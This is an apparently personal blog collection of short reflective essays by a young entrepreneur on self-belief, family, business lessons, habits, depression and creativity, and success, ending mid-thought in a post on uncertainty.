# Best Interests

I've realized something crucial.

We're cuddled. The reason we can do a lot of the things and take risks
is because we've been cuddled into an immense belief in ourselves.

When I was 10, I had no doubts that I was very intelligent, and strong,
and amazing, thanks to my mother's love.

But, when we grow up, we don't always interact with our mothers!

It can be dangerous to think that every person you meet has the same
interests that your mother has for you.

Every time someone says something, ask yourself, do they act differently
to what they say?

What were they thinking when they said what they said? Was it different?

# On the fragility of beliefs

I had an interesting realization after talking to a friend I hadn't seen
in a while.

Our entire lives are strung together by a set of beliefs. How we look at
making money, friendships, love, etc forms the construct of the way we
see the world, the way we see ourselves, and the way we interact with
others. But, these are just beliefs, they aren't reality. Losing a
belief can happen in a flicker of an eye, and your entire life starts to
dissassemble.

I'm beginning to see why the life of entrepeneurship leads people into
mental breakdowns! Our entire lives are basically beliefs that we set
for ourselves, and most of the time they aren't validated by anyone
else. That can get pretty scary.

# You choose how you react to things

Something interesting happened to me the last week. I had some trouble
securing a flat in Taipei, and I bubbling with infuration about it for
the last week. I didn't want to think about the situation, and I got
angrier and angrier that I had to think about it. I focused only on the
negative side of what happened.

But, life isn't so black and white. I feel like almost any circumstance
has a spectrum of emotions, and if we choose to, we can occupy ourselves
24/7 with the positive spectre. I don't mean just blissfuly ignoring
things, more 'doing what needs to be done'.

If it happened, and you have to do it, why not be happy about doing it?

# Feeling Success, Being Successful, Having other people think you're successful

All of these goals are exclusive to each other. When you work on feeling
successful, you're not necesarily being successful. When you work on
making other people think you're successful, you're not being
successful.

And there are 24 hours in a day. Where do you want to focus most of your
time on?

To be honest, I'm not sure where the answer is.

# Trying not to try

I was sitting in a bar today, and I thought for a little bit. When I
wasn't aware of what was happening around me, everything was simpler.
Even if I wanted to pretend now, I can't ever go back to that. Even not
trying is trying not to try.

So, there's no going back. Now, you we have to immerse ourselves enough
that we got to the other side. Is there some other way?

# The point of breaking down

"You can be an entrepeneur!"

"Everyone who tells you otherwise is just spiteful"

"They just want to protect their beliefs, so they take it out on you"

"Screw that, you don't need to go to school, you don't need a job, all
the values everyone has doesn't need to be yours"

"Forge your own values"

I have said every single one of these lines. I thought that people
closest to me, even my family, had something behind their minds that
told them I couldn't take this path, because it would invalidate theirs.

But, that's not the case.

Paul Graham mentions those "lows" in his essays. It's very noncahalant
when people say it. It's going to be nonchalant when I say it. However,
the lows are there. You won't even expect it. They don't seem like any
type of low you've ever been through. It's a combination of desperation,
quick action, fear, backpeddling and pushing forward day and night into
something that comes out invalid.

It's scary. I now know why people warned me about this path.

I want what's on the other side though. I want it really, really, really
fucking bad.

I will get there

# The reason to make art

I'm about to head over to a negotiation right now. It's with a boutique
hotel we made a service trade with, and I'm a bit underslept and tired.
I opened up youtube, and listened to some techno.

This is why push ourselves to make something great. The art the person
made helps me, and helps people see reality. I hope I can do something
like that for those who I care for.

# Your perspective has nothing to do with reality.

One quote we used for a marketing piece somes this up the best ---

> **Money moves based on non-judgmental market forces, not morality.**
> The difficult truth is: Being a good person, being a better person,
> being an exceptionally talented person, making or selling the better
> or even best product, or delivering the finest service does not
> automatically entitle you to wealth... If you think that you should be
> financially rewarded because you are honest, hard-working, and kind to
> old people and pets, you're in for a very disappointing life.

No matter how you feel about something, it doesn't change that it's
going to happen. This occurs to me in two situations. One, I practice
something, and I feel the pain, but I know it will lead to the results I
want, and the actual situation has no negatives in the first place. Two,
I avoid something becuase I don't want to think about it.

A perfect example of the latter --- In Taiwan I was having trouble
finding living accomodations, so I ignored it. Sleeping at the computer
cafe was very real...:P

The closer we get to professionalism and our goals, I feel like closer
we are to the reality of things.

# Constantly Striving

Women. I remember how many discussions I've been regarding love, dating,
talking with girls. I was a little bit shy and scared when I was
younger. Thanks to my parents I was ridiculously confident in most
things, but a pang would vibrate in my body when I wanted to talk to
girls I had crushes on.

When I tried to become better, the common advice was

"Don't worry, just be you"

or

"You need to unlearn. Just be natural"

I think this advice comes form a very good place. When you see someone
who is already successful, it looks effortless. It's like the kick of a
5th degree black belt --- they don't think about it anymore. Yes, that's
true, but how do you get there?

It's not by not thinking...

You can't unlearn by commanding yourself to unlearn. You unlearn by
pushing yourself and observing the results. The end result won't look
like the way you do things now, this is the only way to get there

# Making the most you can out of the middle

This last month, a slew of competing ideologies swam through my brain,
alongside seeing my family, moving to Taiwan, ramping up on work...

Before I flew to Taiwan, I decided to bring a plan. I wanted to →

Learn Chinese

Get a girlfriend

Start Suca Diving

Grow my business by working 10 hours / week

Launch a web app

Take the SATs for Oxford ( I am a Canadian, and didn't take them before.
Our universities didn't need it )

Now, the first logical question was...why the hell did I want to do all
of this?

than why would I want to do all of this at the same time?

I dream for, and I live for building a strong business, building up
family, growing my skillsets and ability to interact with people. I
think the reason someone chooses to live is largely arbitrary, but
that's what I have chosen. I have a choice not to do any of these
things, but I can't imagine living without doing this. Though this
doesn't address the second question

Why would I want to do all of this at the same time?

There are twenty four hours in a day. I know what my capabilities are.
Why not stagger these things out over 10 years? In 10 years I'll be 29
years old. If I were to have a million dollars in the bank, have a
strong family, speak 4 languages...and scuba dive, I would be fine. if I
were to stagger these goals, and it doesn't have to be 10 years, I have
a real shot at achieving them.

Though, that isn't what I am doing.

The second question is what I have been struggling with. I feel like
many people don't answer the second question. I see intelligent driven
people attacking at all fronts, diluting their ability to win.

For me, it was born out of a fear. A sense of urgency. I felt that if I
weren't to accomplish this now, I would never be able to do it. I would
be a failure to my parents, my friends, and myself.

It's a lack of trust in yourself. If you were to do only one thing, your
confidence hinges on it. Your dreams begin to clash with the world. You
start to see where the edges of your capability lie.

That's what I'm beginning to see. There is no forskaing one thing to do
another. There is no urgency. There is only action. Step by step.

# Your own Voice

Life comes with a series of complex, never ending questions. Sometimes,
people are able to keep their sanity and function with the words of
Seneca, Boethius, Jesus Christ, Muhammed and other systems of thoughts
(Recently, celebrities have replaced some of these icons). These words
are more valuable to humans than any sort of money or material object,
for it helps us live our lives without too many questions. However,
their massive appeal and usability lead to their downfall, because it's
impossible to share the same reference point of the author, and hence
many ideas don't apply to you, and you don't know which ones.

For instance, look at the problem with homosexuality in the bible. Be
good, and don't be gay. For a large majority of people, they'll be good,
and they won't be gay. They weren't gay in the first place, so it's no
problem. But, what of the other 1%? This mass adoption of values causes
so much anxiety, stress, and destroyed relationships.

Life is like playing professional basketball. You can read about all the
players, and you can know every team, and you can think you'll know
who's going to win and why, but you won't be playing basketball. These
values have a lot of merit, but by simply learning the values, we never
learny *why *they were set in the first place. We can't replicate being
Seneca, and hence we can't know why he said what he said.

My father told me this many times, but I never truly understood. Take
the words of the philosopher, but your only true teacher is experience.
It is what tells you right and wrong. Form your own opinions, and test
them in the real world. At least that's the only way, for me at least,
to stay true to myself.

# An insight from James Altucher

> But there's that Zen story: A man goes to a Zen master and says, "I
> would like to move to this city. What do you think of the people
> here?" And the Zen master says, "What were the people like in your old
> city?" And the man says, "They were awful, mean, spiteful." The Zen
> master says, "they are the same here. You shouldn't move here." Then
> another person goes to the Zen master and says, "I'd like to move to
> your city. What do you think of the people here?" And the Zen master
> says, "What were the people like in your old city?" And the man says,
> "They were very nice people. Very smart. I enjoyed being around them."
> And the Zen master says, "They are the same here. You will enjoy it
> here."

<http://www.jamesaltucher.com/>

# For the hustle

# Even head

This last month, a multitude of lessons were learned from the school of
hard knocks. Working hard, making and breaking relationships, and seeing
where my limits are currently.

This all lead to a swing in net worth, and a swing in my outlook of the
world. I'll try to share what I've learned, though everything's too
close to home currently for me to objectively break things down.

The most important lesson I've gotten is based on how I looked at the
world. I had a very Japanese classical-eraish look at the way people and
business worked. I though that the way my family treated me would
permeate through my business associates and friends. I wanted to look
out for other people's interest, and trust that they would look out for
myne. This would lead to a much cleaner, happier exchange. No haggling
necessessary.

The common side effect to thinking like this is that you become very
intimate with people very quickly. If that's you, please read on.

You meet someone to do business, or make a new friend, or a new
relationship, and you're ready to do many things. You're ready to make
commitments, or to sacrifice your health, things important to you, to
take care of their interests. This way of treating people isn't
necessarily wrong. Again, I do this with my fmaily, and I am absolutely
greatful for the kind of relationship I share with them.

The problem with permeating this type of thining throughout is that
these privelages have to be earned. A new friend, a new relationship
can't possibly earn intimacy to that effect.

99% of people don't see the type of good will that you're creating.
You're only setting yourself up to be burned. When you see that they
don't reciprocate, you swing 100% the other way. You start to feel
bretrayed by the other person.

That's the second side effect. If your appraisal of a person shifts
wildly, please read on.

This is a very fucking childish way of doing business, or living life.

Firstly, people need to earn that type of good will. It takes going to
war together, for years on end, to really develop a relationship like
that. When you meet someone and try to manufucture that experience, it's
fake. It leads you to appraise people badly, and to generally do bad
work and leave unfinished projects.

My lesson is to keep people around the middle. No more wild shifts. Be
professional, make backup plans, and make sure you think to yourself,
how can this person fuck me in this situation. Than, try to make it so
they don't have the option to fuck you.

This doesn't mean to be hostile and bitter. That's the same as being
immediately loving, it's fake. Simply put a question mark on their
character, until you see it in real life. let them prove themeselves,
and let yourself be proven to them.

# Be friends with your clients

Sales can be seen as a very combatative endeveaur. To me, it still seems
that way, but the better I see people get, the more it's about building
lasting friendships. Your clients should be people you can dine with at
your home, and you theirs. It's the testament to you looking out for
their needs, offering them the best product, and overdelivering.

# When aggravated with others

i had a strong work session with my business partner yesterday. We got a
lot done, he set up a new marketing channel, we were preparing to outdo
our projections. However, for some reason, I was off the entire time; I
felt frustrated, and I pushed back on every corner and talked about how
we were task switching. Something interesting came out of this though.

When you're aggrevated, are you really ever aggrevated with others, or
are you aggrevated with yourself?

That day I didn't think I got much done, and the frustrations I brought
up --- task switching etc --- were what *I *was doing the most.
Aggrevatation can lead to some interesting insights in what you could
improve at. Just make sure you don't fuck with other people because of
it.

# Special

So far, every single person I have interacted with and gotten to know
had a special, unique side to them that was completely their own. There
is no such thing as normal, at least that's how I'm going to treat and
speak of others going forwards.

# Waking up just in time to be late

Bzzzt

That's my alarm. It's an old phone that ended up in a street fight in
Mongolia, and now acts as my alarm clock. I stir, search for that phone
and surgically stop the timer. I have enough energy at this point, but I
sink back to bed.

For the next 2--3 hours, I am in a battle with myself. I tell myself I
won't have time to work out or eat before I start business. But, it'll
be okay I tell myself. I get more an more anxious, until I end up
getting up.

Great. Just enough time to go to the gym fast, eat bad food, and be 20
minutes late.

How do you act, when you wake up like that all the time? How do other
people react to you?

Well, I for one, felt stressed. I felt like I had no time in the day,
that time was passing me by. That I didn't have any control over my
life.

I blamed it at a lot of things. My sleep schedule is screwed up. I have
more commitments than I could have coneived of before. Business is
growing, and it's causing me stress.

I've met a lot of people this year, and I think if you're a startup
founder, or an artist, or an extremely ambitious student, you get this
type of feeling. You work to no end, You get lost in creating.
Eventually, you reach a level of stress that starts to nag at you. It
tries to break you down. You realize what you're missing. Maybe you
haven't seen your family, maybe your other goals have started to fall
through, you see yourself become unhealthy.

At least, that's how it has been for me.

But I realized something. The latter has nothing to do with my business.

What if I had waken up earlier? What if I had a healthy diet? What if
all of the small bad descisions I make on a regular basis were small
good descisions?

I've realized that *habit* constructs your day. It constructed my day
previously. I just had enough lax in my schedule that I could have dealt
with sloppy habits.

It is not the critic who counts; not the man who points out how the
strong man stumbles, or where the doer of deeds could have done them
better. The credit belongs to the man who is actually in the arena,
whose face is marred by dust and sweat and blood; who strives valiantly;
who errs, who comes short again and again, because there is no effort
without error and shortcoming; but who does actually strive to do the
deeds; who knows great enthusiasms, the great devotions; who spends
himself in a worthy cause; who at the best knows in the end the triumph
of high achievement, and who at the worst, if he fails, at least fails
while daring greatly, so that his place shall never be with those cold
and timid souls who neither know victory nor defeat.

If you believe in that quote, the answer isn't to scale back on what you
believe will create change. The answer is to build a better life for
yourself.

Do it little by little.

I'm going to start by fixing my sleeping schedule.

Then, no more sugar.

After that, maybe no hackernews

# Depression and Creativity

Van Gogh, Shakespeare, Winston Churchill, Charles Dickens. All of these
people have used their creativity to reimagine something in a new light,
to instigate change and create master works. All of these people, also
experienced varying degrees of depression.

Abraham Lincoln, Isaac Newton, and the list continues. It's
devastatingly too common that so many thought leaders of our generation
experience depression. In effect Psychological studies indigate that
depression and creativity are linked. However, we've seen over and over
again how devastating it can be. When people spiral for too long, they
fall to such lows thay they break down or commit suicide. We've lost a
lot of great minds, and excellent ideas because of the way we handle
depression, and I'm writing this post to suggest an alternative, a way
to be creative without letting yourself break down.

First, let's set scopes on Depression. I identify it as a sense of
hopelessness and existential dread, that is prolonged for an *unnatural*
period of time. The unnatural period of time is the literal killer. It's
the spiraling into more and more severe dread, until it gets impossible
to get out. If it wasn't for the spiraling effect, depression would be a
completely healthy experience everyone would grow from. One facet of it,
"Rumination" is particularily helpful for creativity. Rumination is
defined as the "compulsively focused attention on the symptoms of one's
distress, and on its possible causes and consequences, as opposed to its
solutions." For example, when you ask a girl out and say something
stupid, you "ruminate" for the next hour about how stupid what you said
was. This introspection to identify mistakes, truly understand yourself
and ponder on life can be the instigator to some great ideas.

But, what kills is the spiraling effect. A sense of hopelessness piled
up ontop of more hopelessness. An insight I've had on this is that it
usually happens when there are *multiple* things wrong. Instead of just
ruminating over one thing, people are lonely, they don't eat healthy,
exercise, their place is dirty. In short *their life is more supporting
of depression*.

This was the case with me. I had a lot of things going right, but I had
a horrible diet, I didn't work out enough, I didn't meet new people, so
when a small roadblock showed up, it was hard to bounce back. Each
depression lead to some creative insights for my business and life, but
I could see where the trend was headed.

Almost all creativity in life is basically negated if you can't get out
of depression. It only has to happen once, than it's kind of over. But,
I don't want to feel normal all the time. I want to be happy, and I want
to be sad. I *want* to reflect and be creative.

That's when it hit me. It was a pretty simple thought, but it was big
for me. I started to change the environment around me. I wanted to allow
myself to ruminate and feel depressed, but I wanted *everything* around
me to dispell the other factor of depression.

I started regulating my sleep, making sure there was healthy food all
aorund me, making sure I had a social circle that I could check in with.
I regularily talked with my family, and built in periods for relaxation
and seeing nature in my schedule.

I'm still on this path, but my goal is to create an environemnt around
me that is possible by default. This will allow me experience the swings
and be creative, while at the same time allow for me to jump back.

If you're an entrepneur or an artist, I highly suggest asking you this
question : What are the default standards in my life right now?

How can you change those standards for the better, so that when you're
in down swing it can help life you up?

# Heroes

Today, Mithridates and Ceasar aren't the only heroes we worship. We
worship bloggers and our friends who we perceive to have achieved
further than us. It's that friend who always manages to get 99% averages
without working, or the one who seems to be good at everything, or the
blogger you think has his life figured out.

There's a "secret" that I've discovered, that I think a lot of
successful happy people discover. I am 100% certain this is true,
because I was the but end of that "secret" recently.

A friend of myne who I respect immensly looks up to me. I got a chance
to understand how he thinks I am and act on a daily basis. The truth of
the matter is that I am not fucking different!

The things I do every day aren't adventures from the books. The things
that people think are the most fun, i.e "travelling" and "high level
business" actually isn't what's remembered. It's that trip at the park
with friends.

A big lesson I've gotten out of this is to stop the "If this than that"
way of thinking about life.

If you're not happy now, no amount of achievements are going to change
that. Start building the life you want to build. Appreciate things every
day, live well and eat healthy. Those the are the fundamentals.

The next time, with all your vitality is to attack problems you want to
solve.

The "secret" is to be happy already. It's going to help you succeed, and
when you look back at your life, there will only be one way you'll feel.

# The Last 10%

Pouring your heart into a deal. You do well getting their needs, the
offer is tight, you're very friendly and you've developed great rapport.
It's getting close to descision time, and the anxiety is rising with
every call. You do what's in your understanding, and yet...fwooop.

After 90% of the way there, there's 10% you don't know. The deal falls
through, but you can't pinpoint the reason why. Was it your
followthrough? Did you speak to the wrong person? Did you not get her
buying criteria correctly? Was there no reason to close now?

You know you did something wrong, but it's *just* outside your
mindspace. This, for me, is the most frustrating experience in business,
sales, and life, to be honest.

It's what I think makes a lot of people stop midway. It sure has made me
question a lot of what I do. The feeling of helplessness, after being
90% there, and fwoop.

But, I've realized something. I think that last 10% is ten times harder
to acquire then the first 90%. That's why there's so much more reward
after getting it.

If you want to get where you want to go, and you want to stay sane along
the way, I think it's absolutely crucial to develop a sense of
contentment with the 90%. An understanding that because you did all that
work doesn't entitle you to the gains of 100%. It's going to take time,
ten times more time, and ten times more work, to get the last 10%.

I'll even add one thing to make you happier. I'd look at every time the
deal falls through, as something to be thankful for. Those moments are
what are going to show you what's missing.

# Listening

The way you want to be heard is the way those you love and respect want
to be heard.

The way you have great ideas and you want to share it and be proud,
those who you love and respect have great ideas that they can't wait to
share with you and be proud

The way you feel anxiety, the way those who you love and respect feel
anxiety.

The way you feel hurt when others don't listen or pay attention, the way
those who you love and respect feel hurt when you don't listen and pay
attention.

I make this mistake too much, and I think I finally get why. It's a sign
that I need to grow, to get my confidence and contentment from the
inside, and use that as a well for my friends and loved ones. It's so
easy to understand how we feel, but it's trivially easy to miss the
signs that someone feels ignored by you, or unheard by you. How fast
would you feel it if you were the one who was unheard?

Perhaps, at the end of every day, I'm going to ask myself: "What's
something interesting that your inner circle has told you about
themeselves? How are they emotionally and physically?"

It's going to take practice, but building strong, life-long
relationships that we want doesn't come from speaking, it comes from
listening.

# Image and reality

I've noticed in my life, and in the lives of many others, there's two
motivations for doing something. The first, is to preserve an image of
yourself. The second, is to build the reality that you'd like to live.

Often, however, building your reality endangers the image you have of
yourself, because you see very clearly where you're at currently.

# Defining Success

Take a minute to think about this question.

What is important to you in your life?

What are your values?

What will make *you* happy?

What type of person are you, and what type of life do you live 20, 10, 5
years from now?

Wether we like it or not, we already have answers to these questions.
Moms, dads, friends, celebrities, writers, they're all giving us answers
to these questions. These questions define our idea of success.

The problem when we don't have our own answers to these questions, is
that we're susceptible to any answer.

Like a kid on ADHD, we jump from answer to answer, saying yes to our
moms, dads, friends, and going through this repeating event.Jumping from
one goal to another, and another, without completing either one.

Ponder deeply about what makes you happy, and what success means to you.
When you answer these questions yourself, you can start to say no. You
will know when you're on the right track and when you're not, and you
can go without taking detours on every person's whims.

# Arguing with my mother

This woman, who nurtured me, who made me, me. Who would hold me when I
was 6 and warm my hands when I was cold. This woman, who when I feel
anxious and I question everything, it is only her undying belief in me
that I don't question.

This woman tells me a story on Skype, and all I can think about is

"No mom, you're wrong"

"Business works this way"

"Life works that way"

"Why are you asking me redundant questions?"

When all we want to do is to talk to each other, to help eachtoher
uplift our days.

It's easy to let the events of the day seep into places they don't
belong. When speaking with a loved one, forget the past, let go of the
future, let that person encompass your being, feel the affection you
have towards them, and say hello. Really say hello.

# Acceptance

Looking through you\
to where the child lies\
Eyes that can see\
You are superman\
You are beautiful\
You mean well

I was thinking about this after reading James Altucher's book, "Choose
Yourself"([no aff
link](https://www.amazon.ca/Choose-Yourself-%20ebook/dp/B00CO8D3G4/ref=sr_1_1?ie=UTF8&qid=1369946778&sr=8-1&keywords=choose+yourself)).
I think it's his best work. It's beautiful and uplifting to read, and
the daily practice works. The idea muscle works. Read that book :).

# On Sprinting To Success

Sometimes, it feels like I'm panting. I look around, and see other
people panting. Running, running with all intensity. With only one
thought, "When will I succeed, so I don't have to be running anymore?".

Okay, let's get into Oxford. Okay, let's sell a company for a million
dollars, let's buy an investment condo.

What do we think is going to happen when we reach that success?

There's so much beauty to see, but we're busy running. We can't sleep,
because we need to be running. When we eat, we think about running. It's
not a real thought, but an undercurrent to all of our thoughts. This
belief in the very back of our heads.

So far, I'm confused about this. I think about this alot. Now, to figure
out how to sleep soundly.

# Before you speak

*Note: this was a note to myself*

Before interacting with the ones you love,

Take a breath, close your eyes, and focus your entire mind on them.

Bring to bear the affection you have for them, your unconditional
acceptance.

Imagine your were in their shoes and see with your mind's eye what they
must be thinking about. With this mindset, enter the conversation, and
truly listen.

Make your goal to understand them as best as you can.

Than, without pushing, learn from them, and guide them the best you can.
Sometimes, the best thing you can do is to listen. Sometimes, it's to
comfort, sometimes to guide, and sometimes to quietly help.

Approach life this way to develop a greater love of your family and the
world, and grow to see their happiness reflected onto you and vice
versa.

# A sunrise above the clouds

I get into the best conversations with my father when we speak one on
one. There's a special bond there, that rejuvanates me and gives me
courage.

During one of these talks, he was telling me stories of everything he
would show me when we went to Georgia.

He told me, when go there, we can go to "Mta", a mountain close to his
village, and we'll be able to see Georgia above the clouds.

I was wowed, and I asked him when he saw such a beautiful scene.

He told me when he was a child, his sister took him. That's where all
the villagers would go during the summer.

During my father's childhood, he was very poor. His father had died, and
his house had no floor. Yet, he could still enjoy the scenery above the
clouds.

No matter where you are in life, happiness is there.

Happiness is not attached to your goals.

Perhaps, happiness is the essential ingredient for experiencing life,
and there's a different reason altogether to achieve in life. It might
have something to do with zest, with testing yourself, with curiosity
regarding your reach.

# The Uselessness of Guilt

How many times have we said 'Yeah, I should really run more', or thought
ceaselessly over the unanswered emails we have lingering in our inboxes.

After feeling the guilt, how many of us have actually gone up and went
running, or cleared our inboxes? Never.

Guilt simply mixes into your habits, so instead of just not doing
something, you don't do something and feel guilty about it.

Ramit Sethi talks about this extensively, and it finally hit me.

It's not guilt that forces you to change your behaviour, but external
triggers. Signing up for a personal trainer for example.

When you're feeling guilt or anxiety, stop feeling it, and ask yourself,
'why am I not doing that right now?". Find an answer, and the next day
work to create a remedy for it.

# The Correct Role Model on Busy

Many of us feel frustrated that we can't fit what we want to get done
into our schedule. Working out, time with family, learning another
language, building new relationships all take the side as we try to fit
everything in.

This was my mode of thinking and frustration, until I reunited with my
sister. She gets 3 times more things done in a day than I do. This led
me to readjust my thinking on what was possible.

You can get quite a lot done, but you'll need to surround yourself with
*truly busy people. *If you think answering 10 emails a day is too much,
know that there are people who answer a 1000.

Learn from them, and adjust accordignly. With me, if I have a task to
do, and I have time to do it, I often waste that time until it's too
late. Just fixing this one thing has allowed me to add a project and
gain 5kg in the last 20 days.

# Excellence takes time

Here's a thought at why it's hard to become excellent at things.

We all want everything quickly, but it's impossible to become excellent
quickly. Hence, we don't think about and do the things that would make
us excellent.

# The Craftsman Mindset

As young people, half of our day fills by anxious thoughts about the
future.

We want to somehow guarantee it, and we use selling ourselves as a way
to do it. It's easy to fall into the trap of "How can I convince other
people that I am a superstar?"

The reason it's a trap is because it will never releave the anxiety,
because if you are not useful, not excellent at what you do, than you
are not a superstar and that anxiety will never disappear. Selling
yourself is an ever thinning veil.

Instead, remember that you have what it takes, and it will take time. Do
things that will push you to grow your skillset, your ability to lead,
learn and follow.

# Do the best you can now.

Oh the standards that we can have.

Whether it's the quality of your work, or the type of life you lead,
there's always a dream of what that ideal is.

The worst thing you can do is to avoid everything that doesn't hit your
ideal. Let's face it, even if you were hit with your ideal right now,
you couldn't handle it.

You can get there though. Start by enjoing and taking advantage of all
the opportunities you have now. Your standard of opportunities will
naturally come from there, and you will be ready for it.

# The scary, happy feeling

It's scary to ask someone for help, because you find out where you
stand. It's possible that they don't help you and stop liking you all
together.

But, when you are helped, it's an excellent feeling. You are not alone,
you feel gratitude, conversely, more people will help you.

So help others, and ask for help

# The Next Level From Landing Awesome Opportunities

*This is edited out of my journal*

Currently, I have a lot of amazing opportunities that can allow me to
build my skills, to develop myself physically, socially, and
financially.

I've been able to get them because in the past, I have been adamant on
jumping on new opportunties.

However, jumping on opportunities comes with one downside, which is that
you are more disposed to getting new opportunities than on maxing out on
the opportunities that you have.

This will get you very far, but I've been thinking recently about how
explosive my gains have become when I finish the projects that I'm on.
Last month, with intense effort I was able to part-publish a book for
example.

So, without further ado, introducing Action Criteria, a method to both
max out on opportunities and to keep on jumping on even higher leveraged
opportunities.

**Action Criteria:**

**1)** What are the action items on the Top of List?

**2)** Can anything be done? If maximized, go to the new opportunities
at the bottom

After this, I made two lists. One for business, one for Social.

As an example, here's an edited out version of the business list

**Business:**

Practicing for Ox TS

Speaking Mandarin → 1400 Characters

Consulting with O.

Finishing Clients at D.

Running a performance based D. blast

S./SF relationships ( about equiv. to running a D. Blast)

From than on, when in high creativity, I first go about asking what can
I do to mazimize and finish off the opportunities as the top of the
list.

When there's no immediate action to be taken, than I will jump on new
opportunities.

The system also makes sure that I commit to the highest possible
activities that I am able to finish and deliver leveraged work on.

This is to also address the "high creativity" phenomenon I've had, where
on days of very high creativity, I work on very far-off, new projects,
while that day spent working on the closer projects would have produced
higher impact.

# The hardest thing about a step forward

Is that you can no longer stay in the same place you were before.

To be with people you love, to do things you love, you have to let go of
what's just okay. For a moment, there's emptyness, but that is the
distance to cross. It's shorter than you could ever imagine though.

# The essential things

There are many things I want.

But, I write this to remind myself.

Doing good, loving family, understanding others, staying healthy,
learning.

These are my essential things. When I want something, remember what is
essential. Nothing is more important than what is essential.

Happiness is routed in this essential.

# The next level from solo

A lot of us in technology have started businesses when we were younger,
and it gave us the generalist skillset necessary to build prototypes.

But, there's another level. Focus on doing something excellent, and get
a lot of people involved in the work that you'd like to accomplish. A
professional photographer, a copywriter, an ops person, a designer, a
coder.

These are the people who come together to build the sites we admire so
much. The value from the finished work when collaborating with masters,
as you would imagine, is on a completely different level, and offers
completely different rewards.

# Life is not a story

of being a nerd in school, and then rising up and kissing the
cheerleader.

of struggle until you win and show your doubters wrong

of battles with others, of intense love.

Life is not a story.

A 2 hour epic is fun to watch, but we are trying to adapt those 2 hours
to out 90 years.

If we focus and expect crecendos, we miss the more important space
between them.

# The Talent Excuse

I've seen this excuse in academia and in programming repeated over and
over.

People just think they need to be born with it, and they can't code or
do well in school otherwise.

There's something to be said about talent, but that's when you're
thinking about how to be become the best programmer. Not in your
community, but maybe the world. Talent plays a role there.

But, when it comes to a standarized curriculum, or a skillset that
millions of other people have learned, it's not about talent.

It can be about a lot of things --- learning strategies, the right mix
of mentors, learning syles, which are all fixable.

# Mistakes of Ambition

*Make mistakes of ambition and not mistakes of sloth. Develop the
strength to do bold things, not the strength to suffer. --- Machiavelli*

# On Work

I had the pleasure to meet Daniel Burka today.

You could tell the enthusiasm he had for what he was doing, and you
could also tell something that's very rare in people.

Whether we talked about clients, or methods of learning, he was focused
on being excellent. From stories of making many, many variations, to the
way he prefered to work with people, it was all about striving to make
something great together.

A lot of designers aim to just get their work done, but being excellent
is much more then that. It's being on the same team as your clients,
doing the best you can with them, on the same team. Standing up for your
decisions, coming in with curiosity and a drive to create something
together.

# Feeling Stupid

The first time you meet with people you admire, you're going to make a
fool of yourself.

No matter how much you prepare, you will make a fool of yourself.

It feels a bit wacky, but they are the stripes. Comfort comes from
familiarity.

# Notes on outreach

*These are a few notes I gave to myself after an intensive outreach
related campaign. Maybe one day I'll turn it into a post, but wanted to
share it anways.*

### Most important things to remember

-   Be ruthless with what you write down --- only what helps you convey
    your narrative and what you want. No extra words, no extra actions.
-   Again, you NEED to have a narrative. If you did something, only say
    it if it helps build your narrative.
-   Follow up
-   Don't disqualify yourself. That's the job of the decision maker

### Success perecentage has a half life on every day you don't reply

Say you get an email from someone you consider important. You think you
can come up with an okay response, but it'll take you a day to come up
with a great one. DONT wait the day! Every day you wait, imagine that
your chance of getting the deal is now 50% worse. There's no way a
slightly better email will make up for 50%. Even if it did, there's a
much higher chance that you'll stall on the second day too, so remember
that.

This makes you be a responsive, on the ball type of person, which is
what top performers are.

# Validation

I just got an offer to work with one of the more well known companies in
Sillicon Valley.

This is what I was looking for, for a while. The 'stamp' of approval, if
you will. I'm writing this as a note to remind myself.

After you get the stamp of approval, nothing changes. Your inner self
stays the same, your worries are the same. No one can stamp you and say
you're good or bad, it's whether you think you are good or bad.

The stamp is not going to make you sleep any better with the skills that
you think you lack. Now it's even more imperative to learn it.

I also strangely feel like I'm going to miss the stage that I was in.
The not being 'proven' stage. I felt more like a kid, I felt closer to
my mom and dad, in the they protect me kind of way. During that stage, I
enjoyed it a lot, but I also wanted to get to the next stage really
fast. That's wasn't necessarily right. I could have enjoyed it even
more. Though, no complaints, I did enjoy it a lot. Just for the future,
enjoy it even more.

The next chapter is going to be different. I'm going to take a lot with
me from the previous one, mainly my dreams for the future, for
entrepeneurship, for family, for friendship. Now, I'm going to have a
slightly different role. I can influence a lot more about how I want to
help my family grow, and how I want to grow personally.

I want reach the days when my father and mother rest in Georgia, my
sisters are excellent doctors, and I can go on long walks with them.

Life is an excellent adventure.

# Options

*me:* "But dad, you don't understand, he's a master in
entrepreneurship!"

*me:* "I don't want him to get the wrong impression, or feel insulted"

*dad:* "Is what you're doing wrong?"

*me:* "Well, no"

*dad:* "Then, if he's as you say he is, of course he'll be fine."

*dad:* "There's a lot more options open to you than you think."

This has been a big realization for me. I often worry too much about
what other people perceive about my actions, rather than actually
worrying about my actions.

With a lot of negotiations coming to a close lately, I've gotten a lot
of lessons. The main one is patience, and overblowing things. When
you're in the middle of things, it's easy to turn tiny details into huge
ones.

Watch for it. Remember to always ask yourself what you want, and what
other people want. If you're earnest about both, you can ignore your
brains imaginary misunderstandings.

# Asking for help

I realized something recently ---

I always thought that if people wanted help, they would ask me.

I was also always too shy / scared / proud to ask others people for
help.

....

Eureka!

*Everyone thinks like that.*

An easy way to counteract this, is to ask people how you can help them.
That gets into the right conversation, helps people develop deeper and
happier relationships.

*Credit to Josef Wasinski on one of our chats at Samovar*

# Find out

Sometimes, we sleep at 9 and wake up at 11.

Because we don't want to find out. It might be news your anxious about,
or work you need to do.

But finding out is what's fun about life. How far can we go? Is this a
something we will conquer, or will the world conquer us?

# When you don't know, work

Daniel Burka told me something that has stayed with me, when faced with
tribulations in career-related stuff.

Just work. Get better.

In the end, that's all that matters. Credentials are a pointer to how
good you are. But, you could also become really fucking good.

I'm nowhere there yet, but I believe in work. When something goes bad,
just fucking work! :D

# Nihil Perditi

'I have lost nothing'

You cannot lose something that is truly yours. If you have lost it, it
wasn't truly yours.

# A very interesting learning loop

I've been reading Taleb's Antifragile. It's a masterpiece. In one of the
chapters, he talks about the antifragile way to grow ---

Random Tinkering -\> Heuristics -\> Practice and Apprenticeship -\>
Random Tinkering...

From personal experience, this strikes a huge chord. It's often too easy
when you don't know how to do something, to think that the only method
is a strictly academic approach, and you'll forever miss something if
you don't take it.

I'm beginning to see more and more that it's a bit of a bs. There's
defintely a lot to be learned in institutions, but I've learned a lot
about algorithms and data structures from mentors sitting down with me
on whiteboards, and making AIs

# On dealing with uncertainty

One of the biggest downsides to high upside low chance endevaurs is that
it can be pretty easy to get disheartened.

